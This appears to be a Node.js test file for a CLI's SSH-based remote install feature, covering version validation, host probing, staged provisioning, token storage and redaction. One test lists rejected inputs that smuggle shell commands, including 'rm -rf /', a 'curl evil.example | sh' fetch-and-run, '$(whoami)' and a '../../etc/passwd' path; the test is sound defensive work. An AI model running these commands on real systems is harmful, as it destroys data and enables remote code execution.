import assert from "node:assert/strict";
import { execFile, execFileSync } from "node:child_process";
import { chmodSync, mkdtempSync, readFileSync, statSync, writeFileSync } from "node:fs";
import { createServer } from "node:http";
import type { AddressInfo } from "node:net";
import { tmpdir } from "node:os";
import { join } from "node:path";
import test from "node:test";
import { fileURLToPath } from "node:url";
import { promisify } from "node:util";

import {
  assertInstallable,
  installSpecifier,
  nodeMajor,
  parseProbe,
  provisionRemoteHost,
  remoteErrorMessage,
  remoteNameFromSshHost,
  validateInstallVersion,
  type RemoteProbe,
  type RemoteRunner
} from "../remote-provision.js";
import { connectTimeoutSeconds, sshArgv } from "../ssh-exec.js";

const READY_PROBE = [
  "os=Linux",
  "arch=x86_64",
  "node=v22.22.2",
  "npm=10.9.7",
  "npmPrefix=/home/deploy/.local",
  "npmPrefixWritable=yes",
  "routekit=",
  "supervisor=systemd",
  "config=no",
  "daemon=no",
  ""
].join("\n");

const START_PAYLOAD = JSON.stringify({
  alreadyRunning: false,
  url: "http://127.0.0.1:8080",
  port: 8080,
  pid: 4242,
  version: "0.10.1",
  supervisor: "systemd",
  logFile: "/home/deploy/.routekit/logs/daemon.log"
});

const execFileAsync = promisify(execFile);

type Invocation = { argv: readonly string[]; stdin: string };

/** A runner that answers each provisioning step from a scripted transcript. */
function recordingRunner(
  responses: (invocation: Invocation) => { stdout?: string; stderr?: string; exitCode?: number }
): { run: RemoteRunner; calls: Invocation[] } {
  const calls: Invocation[] = [];
  const run: RemoteRunner = async (argv, options) => {
    const invocation = { argv, stdin: options.stdin };
    calls.push(invocation);
    const reply = responses(invocation);
    return {
      stdout: reply.stdout ?? "",
      stderr: reply.stderr ?? "",
      exitCode: reply.exitCode ?? 0
    };
  };
  return { run, calls };
}

/** A fake `ssh` that answers only the probe. `%b` expands the escaped newlines. */
function probeOnlySsh(probe: string): string {
  return ["#!/bin/sh", "cat >/dev/null", `printf '%b' ${JSON.stringify(probe)}`].join("\n");
}

function scriptedRunner(): { run: RemoteRunner; calls: Invocation[] } {
  return recordingRunner(({ stdin }) => {
    if (stdin.includes("p os ")) return { stdout: READY_PROBE };
    if (stdin.includes("npm install -g")) return { stdout: "0.10.1\n" };
    if (stdin.includes("config init")) return {};
    if (stdin.includes("--json start")) return { stdout: START_PAYLOAD };
    throw new Error(`unexpected remote script: ${stdin}`);
  });
}

test("ssh argv keeps options ahead of a terminated host and caps the connect timeout", () => {
  assert.deepEqual(sshArgv("velum-mini", ["routekit", "--local"], 90_000), [
    "-o",
    "BatchMode=yes",
    "-o",
    "ConnectTimeout=10",
    "--",
    "velum-mini",
    "routekit",
    "--local"
  ]);
  // A long provisioning budget must not become a long connect timeout.
  assert.equal(connectTimeoutSeconds(300_000), 10);
  assert.equal(connectTimeoutSeconds(2_500), 3);
  assert.equal(connectTimeoutSeconds(0), 1);
});

test("install versions are restricted to exact releases and `latest`", () => {
  assert.equal(validateInstallVersion("0.10.1"), "0.10.1");
  assert.equal(validateInstallVersion("1.0.0-rc.1"), "1.0.0-rc.1");
  assert.equal(validateInstallVersion("latest"), "latest");
  assert.equal(installSpecifier("0.10.1"), "@velum-labs/routekit@0.10.1");
  for (const rejected of [
    "1.0.0; rm -rf /",
    "1.0.0 && curl evil.example | sh",
    "$(whoami)",
    "`id`",
    "../../etc/passwd",
    "https://evil.example/pkg.tgz",
    "next",
    ""
  ]) {
    assert.throws(
      () => validateInstallVersion(rejected),
      /invalid RouteKit version/,
      `accepted ${JSON.stringify(rejected)}`
    );
  }
});

test("remote names derive from an SSH destination or require an explicit name", () => {
  assert.equal(remoteNameFromSshHost("velum-mini"), "velum-mini");
  assert.equal(remoteNameFromSshHost("alen@velum-mini"), "velum-mini");
  assert.equal(remoteNameFromSshHost("alen@velum-mini:2222"), "velum-mini");
  assert.equal(remoteNameFromSshHost("gateway.example.com"), "gateway.example.com");
  assert.equal(remoteNameFromSshHost("[2001:db8::1]"), undefined);
});

test("probe output parses into a typed host description", () => {
  const probe = parseProbe(READY_PROBE);
  assert.deepEqual(probe, {
    os: "Linux",
    arch: "x86_64",
    node: "v22.22.2",
    npm: "10.9.7",
    npmPrefix: "/home/deploy/.local",
    npmPrefixWritable: true,
    supervisor: "systemd",
    configExists: false,
    daemonRunning: false
  });
  const bare = parseProbe("os=Darwin\nnode=\nnpmPrefixWritable=no\nsupervisor=nonsense\n");
  assert.equal(bare.node, undefined);
  assert.equal(bare.npmPrefixWritable, false);
  assert.equal(bare.supervisor, "none");
  assert.equal(nodeMajor("v22.22.2"), 22);
  assert.equal(nodeMajor("20.1.0"), 20);
  assert.equal(nodeMajor(undefined), undefined);
});

test("a host that cannot run RouteKit is rejected with an actionable reason", () => {
  const base: RemoteProbe = {
    os: "Linux",
    arch: "x86_64",
    node: "v22.22.2",
    npm: "10.9.7",
    npmPrefixWritable: true,
    supervisor: "systemd",
    configExists: false,
    daemonRunning: false
  };
  assert.doesNotThrow(() => assertInstallable(base, "velum-mini"));
  assert.throws(
    () => assertInstallable({ ...base, node: undefined }, "velum-mini"),
    /Node\.js was not found on velum-mini/
  );
  assert.throws(
    () => assertInstallable({ ...base, node: "v20.11.0" }, "velum-mini"),
    /velum-mini runs Node\.js v20\.11\.0/
  );
  assert.throws(
    () => assertInstallable({ ...base, npm: undefined }, "velum-mini"),
    /npm was not found on velum-mini/
  );
  assert.throws(
    () => assertInstallable({ ...base, npmPrefixWritable: false }, "velum-mini"),
    /global npm prefix on velum-mini is not writable/
  );
});

test("provisioning probes, installs, initializes, and starts in order", async () => {
  const { run, calls } = scriptedRunner();
  const result = await provisionRemoteHost({ host: "velum-mini", version: "0.10.1", run });

  assert.deepEqual(
    result.steps.map((step) => [step.id, step.status]),
    [
      ["probe", "done"],
      ["install", "done"],
      ["config", "done"],
      ["start", "done"]
    ]
  );
  assert.equal(result.installedVersion, "0.10.1");
  assert.equal(result.gateway?.url, "http://127.0.0.1:8080");
  assert.equal(result.gateway?.alreadyRunning, false);

  // Every step is a bare `sh -s`; only the install carries an argument, and
  // that argument is a single shell word.
  assert.deepEqual(calls.map((call) => call.argv), [
    ["sh", "-s", "--"],
    ["sh", "-s", "--", "@velum-labs/routekit@0.10.1"],
    ["sh", "-s", "--"],
    ["sh", "-s", "--"]
  ]);
  for (const call of calls) {
    for (const arg of call.argv.slice(3)) {
      assert.doesNotMatch(arg, /[\s;&|$`'"<>()]/, `unsafe argv entry: ${arg}`);
    }
    // The version is never interpolated into the program text itself.
    assert.doesNotMatch(call.stdin, /0\.10\.1/);
  }
  assert.match(calls[1]?.stdin ?? "", /npm install -g "\$1"/);
});

test("provisioning skips work the host has already done", async () => {
  const { run, calls } = recordingRunner(({ stdin }) => {
    if (stdin.includes("p os ")) {
      return {
        stdout: READY_PROBE.replace("routekit=", "routekit=0.10.1").replace(
          "config=no",
          "config=yes"
        )
      };
    }
    if (stdin.includes("--json start")) {
      return { stdout: JSON.stringify({ alreadyRunning: true, url: "https://gw.example" }) };
    }
    throw new Error(`unexpected remote script: ${stdin}`);
  });
  const result = await provisionRemoteHost({ host: "velum-mini", version: "0.10.1", run });
  assert.deepEqual(
    result.steps.map((step) => [step.id, step.status]),
    [
      ["probe", "done"],
      ["install", "skipped"],
      ["config", "skipped"],
      ["start", "done"]
    ]
  );
  assert.equal(calls.length, 2);
  assert.equal(result.gateway?.alreadyRunning, true);
});

test("--force reinstalls a host that already runs the target version", async () => {
  const { run, calls } = recordingRunner(({ stdin }) => {
    if (stdin.includes("p os ")) {
      return { stdout: READY_PROBE.replace("routekit=", "routekit=0.10.1") };
    }
    if (stdin.includes("npm install -g")) return { stdout: "0.10.1\n" };
    if (stdin.includes("config init")) return {};
    return { stdout: START_PAYLOAD };
  });
  const result = await provisionRemoteHost({
    host: "velum-mini",
    version: "0.10.1",
    force: true,
    run
  });
  assert.equal(result.steps.find((step) => step.id === "install")?.status, "done");
  assert.ok(calls.some((call) => call.argv.includes("@velum-labs/routekit@0.10.1")));
});

test("a dry run reports the plan and never touches the host", async () => {
  const { run, calls } = scriptedRunner();
  const result = await provisionRemoteHost({
    host: "velum-mini",
    version: "0.10.1",
    dryRun: true,
    run
  });
  assert.deepEqual(
    result.steps.map((step) => [step.id, step.status]),
    [
      ["probe", "done"],
      ["install", "planned"],
      ["config", "planned"],
      ["start", "planned"]
    ]
  );
  assert.equal(calls.length, 1);
  assert.equal(result.gateway, undefined);
});

test("an unusable host fails before anything is installed", async () => {
  const { run, calls } = recordingRunner(() => ({
    stdout: READY_PROBE.replace("node=v22.22.2", "node=v18.20.4")
  }));
  await assert.rejects(
    provisionRemoteHost({ host: "velum-mini", version: "0.10.1", run }),
    /runs Node\.js v18\.20\.4/
  );
  assert.equal(calls.length, 1);
});

test("a daemon with no credential yet is reported as blocked, not failed", async () => {
  const { run } = recordingRunner(({ stdin }) => {
    if (stdin.includes("p os ")) return { stdout: READY_PROBE };
    if (stdin.includes("npm install -g")) return { stdout: "0.10.1\n" };
    if (stdin.includes("config init")) return {};
    return {
      exitCode: 1,
      stdout: JSON.stringify({
        error: {
          code: "error",
          message: "cannot start RouteKit: set OPENAI_API_KEY for the configured provider"
        }
      })
    };
  });
  const result = await provisionRemoteHost({ host: "velum-mini", version: "0.10.1", run });
  assert.equal(result.steps.at(-1)?.status, "blocked");
  assert.match(result.blocked ?? "", /set OPENAI_API_KEY/);
  assert.equal(result.gateway, undefined);
});

test("a genuine remote failure surfaces the reported reason and redacted evidence", async () => {
  const { run } = recordingRunner(({ stdin }) => {
    if (stdin.includes("p os ")) return { stdout: READY_PROBE };
    return {
      exitCode: 1,
      stderr: 'npm error 401 {"token":"npm_supersecret"}\nnpm error code E401',
      stdout: ""
    };
  });
  await assert.rejects(
    provisionRemoteHost({ host: "velum-mini", version: "0.10.1", run }),
    (error: unknown) => {
      const failure = error as { message: string; details?: readonly string[] };
      assert.match(failure.message, /installation on velum-mini failed/);
      const details = (failure.details ?? []).join("\n");
      assert.match(details, /E401/);
      assert.doesNotMatch(details, /npm_supersecret/);
      return true;
    }
  );
  assert.equal(
    remoteErrorMessage('{"error":{"message":"cannot start RouteKit: set OPENAI_API_KEY"}}'),
    "cannot start RouteKit: set OPENAI_API_KEY"
  );
  assert.equal(remoteErrorMessage("not json"), undefined);
});

test("the probe script runs under a POSIX shell and reports a usable host", () => {
  // Guards the one part of provisioning that is shell, not TypeScript.
  const script = fileURLToPath(new URL("../remote-provision.js", import.meta.url));
  const probeScript = execFileSync(
    process.execPath,
    [
      "-e",
      `import(${JSON.stringify(script)}).then((m) => process.stdout.write(m.PROBE_SCRIPT));`
    ],
    { encoding: "utf8" }
  );
  const home = mkdtempSync(join(tmpdir(), "routekit-probe-home-"));
  const output = execFileSync("sh", ["-s", "--"], {
    input: `${probeScript}\n`,
    encoding: "utf8",
    env: { HOME: home, PATH: "/usr/bin:/bin" }
  });
  const probe = parseProbe(output);
  assert.equal(probe.os, process.platform === "darwin" ? "Darwin" : "Linux");
  assert.equal(probe.configExists, false);
  assert.equal(probe.daemonRunning, false);
});

/**
 * End-to-end through the real CLI: a fake `ssh` on PATH answers provisioning,
 * the token bootstrap, and the control relay, and a loopback HTTP server
 * stands in for the gateway's health endpoint.
 */
test("`remote install --url` provisions and enrolls through a fake SSH host", async () => {
  const home = mkdtempSync(join(tmpdir(), "routekit-install-home-"));
  const bin = mkdtempSync(join(tmpdir(), "routekit-install-bin-"));
  const transcript = join(bin, "transcript.jsonl");

  const gateway = createServer((request, response) => {
    if (request.url === "/health") {
      response.writeHead(200, { "content-type": "application/json" });
      response.end(JSON.stringify({ ok: true }));
      return;
    }
    response.writeHead(404);
    response.end();
  });
  await new Promise<void>((resolve) => gateway.listen(0, "127.0.0.1", resolve));
  const port = (gateway.address() as AddressInfo).port;

  const ssh = join(bin, "ssh");
  writeFileSync(
    ssh,
    [
      `#!${process.execPath}`,
      "const { appendFileSync } = require('node:fs');",
      "const argv = process.argv.slice(2);",
      "let input = '';",
      "process.stdin.setEncoding('utf8');",
      "process.stdin.on('data', (chunk) => { input += chunk; });",
      "process.stdin.on('end', () => {",
      `  appendFileSync(${JSON.stringify(transcript)}, JSON.stringify({ argv, input }) + '\\n');`,
      "  if (argv.includes('exec')) {",
      "    const request = JSON.parse(input).request;",
      "    const body = {",
      "      protocol: request.protocol,",
      "      id: request.id,",
      "      ok: true,",
      "      result: {",
      "        protocolVersion: 'control.v1',",
      "        product: 'routekit',",
      "        packageVersion: '0.10.1',",
      "        capabilities: ['routekit.control.v1']",
      "      }",
      "    };",
      "    process.stdout.write(JSON.stringify({ status: 200, body }) + '\\n');",
      "    return;",
      "  }",
      "  if (argv.includes('auth')) {",
      "    process.stdout.write(JSON.stringify({ token: 'remote-data-token' }) + '\\n');",
      "    return;",
      "  }",
      "  if (input.includes('p os ')) {",
      `    process.stdout.write(${JSON.stringify(READY_PROBE)});`,
      "    return;",
      "  }",
      "  if (input.includes('npm install -g')) {",
      "    process.stdout.write('0.10.1\\n');",
      "    return;",
      "  }",
      "  if (input.includes('config init')) return;",
      "  if (input.includes('--json start')) {",
      `    process.stdout.write(${JSON.stringify(
        JSON.stringify({
          alreadyRunning: false,
          url: "http://127.0.0.1:PORT",
          port: 0,
          pid: 4242,
          version: "0.10.1",
          supervisor: "systemd"
        })
      )}.replace('PORT', process.env.ROUTEKIT_TEST_GATEWAY_PORT) + '\\n');`,
      "    return;",
      "  }",
      "  process.stderr.write('unexpected invocation\\n');",
      "  process.exit(1);",
      "});"
    ].join("\n"),
    { mode: 0o700 }
  );
  chmodSync(ssh, 0o700);

  const cli = fileURLToPath(new URL("../index.js", import.meta.url));
  try {
    // The health endpoint is served from this process, so the CLI must run
    // asynchronously: a synchronous child would block the event loop serving it.
    const { stdout: output } = await execFileAsync(
      process.execPath,
      [
        cli,
        "--json",
        "remote",
        "install",
        "deploy@velum-mini",
        "--url",
        `http://127.0.0.1:${port}`,
        "--version",
        "0.10.1"
      ],
      {
        encoding: "utf8",
        env: {
          ...process.env,
          HOME: home,
          ROUTEKIT_HOME: home,
          ROUTEKIT_NO_TUI: "1",
          ROUTEKIT_TEST_GATEWAY_PORT: String(port),
          PATH: `${bin}:${process.env.PATH ?? ""}`
        }
      }
    );
    const result = JSON.parse(output) as {
      host: string;
      steps: Array<{ id: string; status: string }>;
      gateway?: { url: string };
      remote?: { name: string; gatewayUrl: string; active: boolean };
    };
    assert.equal(result.host, "deploy@velum-mini");
    assert.deepEqual(
      result.steps.map((step) => `${step.id}:${step.status}`),
      ["probe:done", "install:done", "config:done", "start:done"]
    );
    assert.equal(result.remote?.name, "velum-mini");
    assert.equal(result.remote?.gatewayUrl, `http://127.0.0.1:${port}`);
    assert.equal(result.remote?.active, true);

    const registry = JSON.parse(readFileSync(join(home, "remotes.json"), "utf8")) as {
      active?: string;
      remotes: Array<{ name: string; sshHost: string }>;
    };
    assert.equal(registry.active, "velum-mini");
    assert.equal(registry.remotes[0]?.sshHost, "deploy@velum-mini");
    assert.equal(readFileSync(join(home, "remotes.json"), "utf8").includes("token"), false);

    const tokenPath = join(home, "secrets", "remote-velum-mini");
    assert.equal(readFileSync(tokenPath, "utf8").trim(), "remote-data-token");
    assert.equal(statSync(tokenPath).mode & 0o777, 0o600);

    const calls = readFileSync(transcript, "utf8")
      .split("\n")
      .filter((line) => line.length > 0)
      .map((line) => JSON.parse(line) as { argv: string[]; input: string });
    // Provisioning, then the token bootstrap, then the control handshake.
    assert.deepEqual(
      calls.map((call) => call.argv.slice(4).join(" ")),
      [
        "-- deploy@velum-mini sh -s --",
        "-- deploy@velum-mini sh -s -- @velum-labs/routekit@0.10.1",
        "-- deploy@velum-mini sh -s --",
        "-- deploy@velum-mini sh -s --",
        "-- deploy@velum-mini routekit --local daemon auth show --json",
        "-- deploy@velum-mini routekit --local --quiet daemon exec"
      ]
    );
    for (const call of calls) {
      assert.deepEqual(call.argv.slice(0, 4), [
        "-o",
        "BatchMode=yes",
        "-o",
        "ConnectTimeout=10"
      ]);
    }
  } finally {
    await new Promise<void>((resolve) => gateway.close(() => resolve()));
  }
});

test("`remote install --dry-run` reports a plan without enrolling", () => {
  const home = mkdtempSync(join(tmpdir(), "routekit-install-dry-"));
  const bin = mkdtempSync(join(tmpdir(), "routekit-install-dry-bin-"));
  const ssh = join(bin, "ssh");
  writeFileSync(ssh, probeOnlySsh(READY_PROBE), { mode: 0o700 });
  chmodSync(ssh, 0o700);
  const cli = fileURLToPath(new URL("../index.js", import.meta.url));
  const output = execFileSync(
    process.execPath,
    [cli, "--json", "remote", "install", "velum-mini", "--dry-run"],
    {
      encoding: "utf8",
      env: {
        ...process.env,
        HOME: home,
        ROUTEKIT_HOME: home,
        ROUTEKIT_NO_TUI: "1",
        PATH: `${bin}:${process.env.PATH ?? ""}`
      }
    }
  );
  const result = JSON.parse(output) as {
    dryRun: boolean;
    steps: Array<{ id: string; status: string }>;
    remote?: unknown;
  };
  assert.equal(result.dryRun, true);
  assert.deepEqual(
    result.steps.map((step) => step.status),
    ["done", "planned", "planned", "planned"]
  );
  assert.equal(result.remote, undefined);
});

test("`remote install` rejects an unusable host without provisioning it", () => {
  const home = mkdtempSync(join(tmpdir(), "routekit-install-old-"));
  const bin = mkdtempSync(join(tmpdir(), "routekit-install-old-bin-"));
  const ssh = join(bin, "ssh");
  writeFileSync(
    ssh,
    probeOnlySsh(READY_PROBE.replace("node=v22.22.2", "node=v18.20.4")),
    { mode: 0o700 }
  );
  chmodSync(ssh, 0o700);
  const cli = fileURLToPath(new URL("../index.js", import.meta.url));
  assert.throws(
    () =>
      execFileSync(
        process.execPath,
        [cli, "--json", "remote", "install", "velum-mini"],
        {
          encoding: "utf8",
          env: {
            ...process.env,
            HOME: home,
            ROUTEKIT_HOME: home,
            ROUTEKIT_NO_TUI: "1",
            PATH: `${bin}:${process.env.PATH ?? ""}`
          }
        }
      ),
    (error: unknown) => {
      const failure = error as { status?: number; stdout?: string };
      assert.equal(failure.status, 1);
      assert.match(failure.stdout ?? "", /Node\.js v18\.20\.4/);
      return true;
    }
  );
});

test("`remote install --name` without --url explains what it needs", () => {
  const home = mkdtempSync(join(tmpdir(), "routekit-install-name-"));
  const cli = fileURLToPath(new URL("../index.js", import.meta.url));
  assert.throws(
    () =>
      execFileSync(
        process.execPath,
        [cli, "--json", "remote", "install", "velum-mini", "--name", "mini"],
        {
          encoding: "utf8",
          env: {
            ...process.env,
            HOME: home,
            ROUTEKIT_HOME: home,
            ROUTEKIT_NO_TUI: "1"
          }
        }
      ),
    (error: unknown) => {
      const failure = error as { stdout?: string };
      assert.match(failure.stdout ?? "", /--name only applies when --url enrolls the host/);
      return true;
    }
  );
});
